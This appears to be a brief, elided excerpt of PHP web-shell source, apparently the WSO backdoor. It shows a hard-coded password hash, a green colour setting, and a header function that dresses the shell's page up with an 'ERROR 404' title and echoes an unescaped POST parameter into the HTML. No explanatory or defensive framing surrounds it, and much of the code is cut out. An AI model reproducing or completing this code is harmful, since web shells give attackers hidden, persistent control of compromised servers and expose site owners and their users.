...
#cucurucho ;)
*/
$auth_pass = "4ac547a6d50e44b0dd83aa2a457441aa"; 
$color = "#00ff00"; 
...
function wsoHeader() { 
    ...
    global $color; 
    echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - ERROR 404 - </title> 
<style> 
